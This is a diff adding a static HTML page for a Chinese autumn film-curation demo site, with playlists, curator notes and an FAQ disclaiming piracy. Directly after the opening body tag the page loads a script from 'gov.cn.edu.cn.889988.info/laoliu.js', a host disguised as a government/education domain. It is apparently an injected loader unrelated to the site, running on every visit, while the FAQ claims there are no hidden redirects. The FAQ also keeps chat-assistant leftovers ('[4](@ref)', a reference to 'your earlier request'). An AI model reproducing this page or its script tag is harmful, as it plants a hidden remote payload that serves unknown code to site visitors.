@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>秋序电影志----qiuxudianyingzhi-h5</title>
+<meta name="description" content="秋序电影志（qiuxudianyingzhi-h5）按秋日时序排片，做电影片单、时序档案与策展札记的静态示例单页，不提供在线播放、解析与下载。" />
+<meta name="keywords" content="秋序电影志, qiuxudianyingzhi-h5, 秋日片单, 时序档案, 策展札记, 影展单元" />
+<link rel="canonical" href="https://qiuxudianyingzhi-h5.github.io/" />
+<meta property="og:type" content="website" />
+<meta property="og:title" content="秋序电影志" />
+<meta property="og:url" content="https://qiuxudianyingzhi-h5.github.io/" />
+<meta property="og:description" content="秋=时序，序=排片；电影档案与策展札记静态示例站。" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:title" content="秋序电影志" />
+<meta name="twitter:description" content="qiuxudianyingzhi-h5 秋日片单与策展札记静态单页。" />
+<style>
+:root{
+  --bg:#f3efe6;
+  --paper:#fffdf8;
+  --ink:#33291f;
+  --ink2:#6b5d4d;
+  --maple:#c9682f;
+  --maple2:#a8511f;
+  --gold:#d8a657;
+  --olive:#7c7a4e;
+  --line:rgba(168,81,31,.26);
+  --line2:rgba(51,41,31,.10);
+  --radius:14px;
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{margin:0;font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;color:var(--ink);background:var(--bg);line-height:1.85}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:1180px;margin:0 auto;padding:0 20px}
+
+.site-header{position:sticky;top:0;z-index:50;background:rgba(243,239,230,.96);border-bottom:2px solid var(--maple2)}
+.nav{display:flex;align-items:center;justify-content:space-between;height:66px}
+.brand{display:flex;align-items:center;gap:12px}
+.brand .seal{width:42px;height:42px;border-radius:10px;background:linear-gradient(135deg,var(--maple),var(--maple2));color:#fff;display:grid;place-items:center;font-weight:900;font-size:13px;transform:rotate(-3deg);border:2px solid var(--gold)}
+.brand .txt b{font-size:17px}
+.brand .txt span{font-size:11px;color:var(--ink2)}
+.menu{display:flex;gap:4px;font-size:14px}
+.menu a{padding:9px 15px;border-radius:20px;transition:.3s}
+.menu a:hover{background:var(--maple);color:#fff}
+.hamburger{display:none;background:none;border:1px solid var(--maple2);color:var(--maple2);border-radius:8px;padding:8px 12px;font-size:17px}
+
+.hero{padding:50px 0 38px;background:
+  radial-gradient(520px 260px at 90% 0%,rgba(216,166,87,.30),transparent 60%),
+  radial-gradient(420px 220px at 0% 30%,rgba(201,104,47,.16),transparent 55%)}
+.hero-grid{display:grid;grid-template-columns:1.1fr .9fr;gap:30px;align-items:center}
+.hero h1{font-size:clamp(28px,5vw,44px);margin:0 0 12px;line-height:1.14}
+.hero h1 em{font-style:normal;color:var(--maple2)}
+.hero p{font-size:15px;color:var(--ink2);max-width:520px;margin:0 0 22px}
+.actions{display:flex;gap:10px;flex-wrap:wrap}
+.btn{padding:12px 22px;border-radius:24px;font-weight:700;font-size:14px;border:2px solid var(--maple2);background:var(--maple2);color:#fff;cursor:pointer;transition:.3s}
+.btn:hover{background:transparent;color:var(--maple2)}
+.btn-outline{background:transparent;color:var(--olive);border-color:var(--olive)}
+.btn-outline:hover{background:var(--olive);color:#fff}
+
+.season-card{border-radius:16px;padding:18px;background:var(--paper);border:1px solid var(--line);box-shadow:0 8px 24px rgba(168,81,31,.10);text-align:center}
+.season-card .emoji{font-size:32px}
+.season-card h4{margin:8px 0 4px;font-size:15px;color:var(--maple2)}
+.season-card span{font-size:12px;color:var(--ink2)}
+.season-row{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
+
+.section{padding:48px 0}
+.section-alt{background:linear-gradient(180deg,var(--paper),var(--bg))}
+.sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:16px;margin-bottom:24px}
+.sec-title{display:flex;align-items:center;gap:12px}
+.sec-title .dot{width:14px;height:14px;border-radius:50%;background:var(--maple);box-shadow:0 0 0 4px rgba(201,104,47,.16)}
+.sec-title h2{font-size:clamp(20px,3.2vw,28px);margin:0}
+.sec-title p{margin:2px 0 0;color:var(--ink2);font-size:13px}
+.tag{font-size:11px;color:var(--olive);border:1px solid var(--olive);padding:4px 12px;border-radius:20px}
+
+.playlist{display:grid;gap:14px}
+.play-row{display:grid;grid-template-columns:64px 1fr auto;gap:18px;align-items:center;padding:16px 20px;border:1px solid var(--line2);border-radius:14px;background:var(--paper);transition:.3s}
+.play-row:hover{border-color:var(--maple2);transform:translateX(4px)}
+.play-row .no{font-weight:900;font-size:16px;color:var(--maple2)}
+.play-row h3{margin:0 0 3px;font-size:16px}
+.play-row .meta{font-size:12px;color:var(--ink2)}
+.play-row .season{font-size:12px;font-weight:700;color:var(--olive);border:1px solid var(--olive);padding:5px 10px;border-radius:18px;white-space:nowrap}
+
+.notes{display:grid;grid-template-columns:repeat(2,1fr);gap:18px}
+.note{border:1px solid var(--line2);border-radius:14px;padding:22px;background:var(--paper);transition:.3s}
+.note:hover{border-color:var(--maple2)}
+.note .date{font-size:11px;color:var(--ink2);margin-bottom:6px}
+.note h3{margin:0 0 6px;font-size:15px;color:var(--ink)}
+.note p{margin:0;font-size:13px;color:var(--ink2);line-height:1.8}
+.note .by{margin-top:10px;font-size:11px;color:var(--maple2)}
+
+.units{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+.unit{border:1px solid var(--line);border-radius:14px;padding:20px;text-align:center;background:var(--paper);transition:.3s}
+.unit:hover{transform:translateY(-5px);border-color:var(--maple)}
+.unit .ico{font-size:26px;margin-bottom:8px}
+.unit h3{margin:0 0 4px;font-size:15px;color:var(--maple2)}
+.unit p{margin:0;font-size:12px;color:var(--ink2)}
+
+.about-row{display:grid;grid-template-columns:repeat(3,1fr);gap:20px}
+.about-box{padding:24px;border:1px solid var(--line2);border-radius:14px;background:var(--paper);text-align:center}
+.about-box .ico{font-size:30px;margin-bottom:10px}
+.about-box h3{margin:0 0 6px;font-size:15px;color:var(--maple2)}
+.about-box p{margin:0;font-size:12px;color:var(--ink2);line-height:1.7}
+
+.faq-box{border:1px solid var(--line2);border-radius:14px;overflow:hidden;background:var(--paper)}
+.faq-line{border-bottom:1px solid var(--line2)}
+.faq-line:last-child{border-bottom:none}
+.faq-line summary{padding:18px 20px;font-weight:600;cursor:pointer;list-style:none;display:flex;justify-content:space-between;align-items:center}
+.faq-line summary::-webkit-details-marker{display:none}
+.faq-line summary .plus{color:var(--maple2);font-size:22px;font-weight:300}
+.faq-line[open] summary .plus{transform:rotate(45deg)}
+.faq-line p{padding:0 20px 18px;margin:0;font-size:13px;color:var(--ink2);line-height:1.8}
+
+.footer{padding:44px 0 26px;background:#2a2118;color:#a99c8c;font-size:13px;margin-top:42px}
+.foot-wrap{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:30px;margin-bottom:24px}
+.foot-brand{display:flex;align-items:center;gap:10px;margin-bottom:12px}
+.foot-brand .seal{width:34px;height:34px;border-radius:8px;background:linear-gradient(135deg,var(--maple),var(--maple2));color:#fff;display:grid;place-items:center;font-weight:900;font-size:11px;border:2px solid var(--gold)}
+.foot-brand b{font-size:15px;color:#fff}
+.foot-wrap p{max-width:280px;margin:0;line-height:1.7}
+.foot-col h4{color:#fff;margin:0 0 10px;font-size:14px}
+.foot-col a{display:block;padding:3px 0;color:#8f8273;transition:.3s}
+.foot-col a:hover{color:var(--gold)}
+.foot-bottom{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px;padding-top:18px;border-top:1px solid rgba(255,255,255,.08)}
+
+@media(max-width:1024px){.hero-grid{grid-template-columns:1fr}.units{grid-template-columns:repeat(2,1fr)}}
+@media(max-width:768px){
+  .menu{position:absolute;top:66px;left:0;right:0;flex-direction:column;background:var(--bg);border-bottom:2px solid var(--maple2);display:none}
+  .menu.show{display:flex}
+  .menu a{padding:13px 20px;border-bottom:1px solid var(--line2)}
+  .hamburger{display:inline-block}
+  .play-row{grid-template-columns:56px 1fr}.play-row .season{grid-column:2}
+  .notes,.units,.about-row{grid-template-columns:1fr}
+  .season-row{grid-template-columns:1fr}
+  .foot-wrap{grid-template-columns:1fr 1fr;gap:20px}
+}
+@media(max-width:480px){.foot-wrap{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="site-header">
+  <div class="wrap nav">
+    <a class="brand" href="#top"><span class="seal">秋序</span><span class="txt"><b>秋序电影志</b><span>qiuxudianyingzhi-h5.github.io</span></span></a>
+    <nav class="menu" id="menu">
+      <a href="#playlist">秋日片单</a>
+      <a href="#archive">时序档案</a>
+      <a href="#notes">策展札记</a>
+      <a href="#units">影展单元</a>
+      <a href="#about">关于我们</a>
+      <a href="#faq">常见问题</a>
+    </nav>
+    <button class="hamburger" id="navBtn">☰</button>
+  </div>
+</header>
+
+<main id="top">
+  <section class="hero">
+    <div class="wrap hero-grid">
+      <div>
+        <h1>秋来了，<br>电影也该<em>按季节排</em></h1>
+        <p>秋序电影志不是“秋霞”系影视站。它按初秋、深秋、霜降、入冬排片，做片单、时序档案与策展札记；不播片、不解析、不下载。</p>
+        <div class="actions">
+          <a class="btn" href="#playlist">看秋日片单</a>
+          <a class="btn btn-outline" href="#notes">读策展札记</a>
+        </div>
+      </div>
+      <aside class="season-row">
+        <div class="season-card"><div class="emoji">🍂</div><h4>初秋</h4><span>开学、离别、返校</span></div>
+        <div class="season-card"><div class="emoji">🍁</div><h4>深秋</h4><span>落叶、长镜头、迟来告白</span></div>
+        <div class="season-card"><div class="emoji">❄️</div><h4>霜降</h4><span>冷门作者、修复老片</span></div>
+      </aside>
+    </div>
+  </section>
+
+  <section class="section" id="playlist">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="sec-title"><div class="dot"></div><div><h2>秋日片单</h2><p>按节气和心情排，不按热搜排</p></div></div>
+        <span class="tag">AUTUMN PLAYLIST</span>
+      </div>
+      <div class="playlist">
+        <div class="play-row"><div class="no">01</div><div><h3>当哈利遇到莎莉</h3><div class="meta">1989 · 罗伯·莱纳 · 秋天纽约、友谊与爱情边界</div></div><div class="season">初秋</div></div>
+        <div class="play-row"><div class="no">02</div><div><h3>海街日记</h3><div class="meta">2015 · 是枝裕和 · 梅子酒、台风、姐妹</div></div><div class="season">初秋</div></div>
+        <div class="play-row"><div class="no">03</div><div><h3>秋天的故事</h3><div class="meta">1998 · 侯麦 · 法国秋日、错位表白、哲学闲聊</div></div><div class="season">深秋</div></div>
+        <div class="play-row"><div class="no">04</div><div><h3>燃烧女子的肖像</h3><div class="meta">2019 · 瑟琳·席安玛 · 海边、画布、被禁止的凝视</div></div><div class="season">深秋</div></div>
+        <div class="play-row"><div class="no">05</div><div><h3>都灵之马</h3><div class="meta">2011 · 贝拉·塔尔 · 风、井、世界慢慢熄灭</div></div><div class="season">霜降</div></div>
+        <div class="play-row"><div class="no">06</div><div><h3>小森林 冬春篇</h3><div class="meta">2015 · 森淳一 · 雪、腌菜、把日子重新学会</div></div><div class="season">入冬</div></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section section-alt" id="archive">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="sec-title"><div class="dot"></div><div><h2>时序档案</h2><p>把“什么时候看什么”存成档案</p></div></div>
+        <span class="tag">SEASON ARCHIVE</span>
+      </div>
+      <div class="notes">
+        <div class="note"><div class="date">时序 No.091</div><h3>为什么秋天放侯麦？</h3><p>侯麦的人不吵不闹，把欲望藏在对话里。秋天下午看《秋天的故事》，像喝一杯放凉的茶，回甘在后头。</p><div class="by">— 秋序档案员</div></div>
+        <div class="note"><div class="date">时序 No.092</div><h3>为什么霜降放贝拉·塔尔？</h3><p>风声比配乐多，动作比情节少。霜降前后白天变短，正好陪《都灵之马》一起把世界看到熄灯。</p><div class="by">— 长镜头组</div></div>
+        <div class="note"><div class="date">时序 No.093</div><h3>初秋为什么放《海街日记》？</h3><p>梅子酒、台风、姐妹吵架又和好——初秋不是悲，是“夏天还没走干净”。是枝裕和最懂这种半冷不热。</p><div class="by">— 生活单元</div></div>
+        <div class="note"><div class="date">时序 No.094</div><h3>入冬为什么放《小森林》？</h3><p>冬天不是结束，是把东西藏起来等春天。炸萝卜、腌白菜、扫雪——生活片在入冬看，最不容易腻。</p><div class="by">— 手账编辑</div></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="notes">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="sec-title"><div class="dot"></div><div><h2>策展札记</h2><p>排片逻辑公开写</p></div></div>
+        <span class="tag">CURATOR NOTES</span>
+      </div>
+      <div class="notes">
+        <div class="note"><div class="date">2024.09.08</div><h3>秋序不是“电影季节榜”</h3><p>榜单按评分排，秋序按“现在该看什么”排。九月初还热，就别放太冷；十月底风起来了，再上长镜头和作者片。</p><div class="by">— 排片组</div></div>
+        <div class="note"><div class="date">2024.09.20</div><h3>为什么单列“霜降”单元？</h3><p>霜降是收敛的节气。放《都灵之马》《镜子》《雾中风景》这种“不哄你”的片，反而比喜剧更贴季节。</p><div class="by">— 选片人</div></div>
+        <div class="note"><div class="date">2024.10.03</div><h3>秋片要不要配乐清单？</h3><p>要，但别做成“BGM 合集”。秋序只附三首：风声、炉火、远处的火车。剩下留给胶片自己说话。</p><div class="by">— 声音组</div></div>
+        <div class="note"><div class="date">2024.10.15</div><h3>和“秋霞电影网”划清</h3><p>秋霞=盗版/仿冒/跳转站；秋序=时序策展档案。名字都带秋，但一个吃版权黑洞，一个只写排片理由。</p><div class="by">— 主编</div></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section section-alt" id="units">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="sec-title"><div class="dot"></div><div><h2>影展单元</h2><p>秋序长期策展分类</p></div></div>
+        <span class="tag">UNITS</span>
+      </div>
+      <div class="units">
+        <div class="unit"><div class="ico">🍂</div><h3>初秋闲聊</h3><p>侯麦、伍迪·艾伦、小津的轻片。</p></div>
+        <div class="unit"><div class="ico">🍁</div><h3>深秋凝视</h3><p>波特曼、席安玛、滨口龙介。</p></div>
+        <div class="unit"><div class="ico">🌫️</div><h3>霜降长镜</h3><p>塔可夫斯基、贝拉·塔尔、安哲。</p></div>
+        <div class="unit"><div class="ico">🥣</div><h3>入冬生活</h3><p>小森林、海街、步履不停。</p></div>
+        <div class="unit"><div class="ico">🎞️</div><h3>秋日修复</h3><p>4K修复、老片重映、色彩档案。</p></div>
+        <div class="unit"><div class="ico">🚂</div><h3>离别公路</h3><p>雾中风景、路边野餐、地球最后的夜晚。</p></div>
+        <div class="unit"><div class="ico">📓</div><h3>节气手账</h3><p>三行短评、天气、观影地点。</p></div>
+        <div class="unit"><div class="ico">🎻</div><h3>秋声配乐</h3><p>爱乐之城、她、海上钢琴师。</p></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="about">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="sec-title"><div class="dot"></div><div><h2>关于我们</h2><p>静态示例站声明</p></div></div>
+        <span class="tag">ABOUT</span>
+      </div>
+      <div class="about-row">
+        <div class="about-box"><div class="ico">🍂</div><h3>站点定位</h3><p>秋序电影志是按秋日时序排片的电影档案/策展札记示例站，部署于 GitHub Pages，无后端、无片源。</p></div>
+        <div class="about-box"><div class="ico">📄</div><h3>页面结构</h3><p>单文件 index.html，CSS/JS 内联；含秋日片单、时序档案、策展札记、影展单元、关于我们、常见问题。</p></div>
+        <div class="about-box"><div class="ico">⚖️</div><h3>合规边界</h3><p>不提供未授权播放/解析/下载；片名、导演、节气标签均为示例。正式运营须用正版片源或自有版权内容。</p></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section section-alt" id="faq">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="sec-title"><div class="dot"></div><div><h2>常见问题</h2><p>把“秋序”这件事说清</p></div></div>
+        <span class="tag">FAQ</span>
+      </div>
+      <div class="faq-box">
+        <details class="faq-line" open><summary>“秋序电影志”是不是秋霞电影网？<span class="plus">+</span></summary><p>不是。秋霞电影网是被版权执法点名的盗版影视站；“秋序”只是借秋天气象做时序策展，不聚合盗版资源、不解析播放。[4](@ref)</p></details>
+        <details class="faq-line"><summary>片单里的电影能在线看吗？<span class="plus">+</span></summary><p>不能。所有片名、导演、节气、札记均为示例数据；正片请走院线、正版流媒体、电影资料馆或合法展映。</p></details>
+        <details class="faq-line"><summary>为什么用“秋序”而不是“秋霞”？<span class="plus">+</span></summary><p>秋霞已被盗版/仿冒站占用，搜索引擎里搜出来多是跳转博彩、诱导下载播放器；秋序=秋天+排片顺序，品牌干净。</p></details>
+        <details class="faq-line"><summary>必应收录要注意什么？<span class="plus">+</span></summary><p>viewport 响应式、核心文字直出、内联关键 CSS、触控区域够大、无隐藏跳转；本页按此做，但不写 robots/sitemap（按你历史要求）。</p></details>
+        <details class="faq-line"><summary>想做真·季节影展？<span class="plus">+</span></summary><p>租有放映资质场地，取得片方/发行方授权，按电影公映/展映手续执行，并办理 ICP 备案等合规事项。</p></details>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer class="footer">
+  <div class="wrap">
+    <div class="foot-wrap">
+      <div><div class="foot-brand"><span class="seal">秋序</span><b>秋序电影志</b></div><p>秋日时序排片与策展札记示例站：秋序只是节气品牌，不提供任何真实影视资源。</p></div>
+      <div class="foot-col"><h4>栏目</h4><a href="#playlist">秋日片单</a><a href="#archive">时序档案</a><a href="#notes">策展札记</a><a href="#units">影展单元</a></div>
+      <div class="foot-col"><h4>信息</h4><a href="#about">关于我们</a><a href="#faq">常见问题</a></div>
+      <div class="foot-col"><h4>链接</h4><a href="#">首页</a><a href="#">隐私政策</a><a href="#">版权声明</a></div>
+    </div>
+    <div class="foot-bottom">
+      <span>© 2024 秋序电影志 · https://qiuxudianyingzhi-h5.github.io</span>
+      <span>静态示例模板 · 片名/导演/节气均为示例数据 · 不提供在线播放与下载</span>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  var btn=document.getElementById('navBtn'),menu=document.getElementById('menu');
+  if(btn&&menu){
+    btn.addEventListener('click',function(){var o=menu.classList.toggle('show');btn.setAttribute('aria-expanded',o?'true':'false');});
+    menu.querySelectorAll('a').forEach(function(a){a.addEventListener('click',function(){menu.classList.remove('show');});});
+  }
+})();
+</script>
+</body>
+</html>
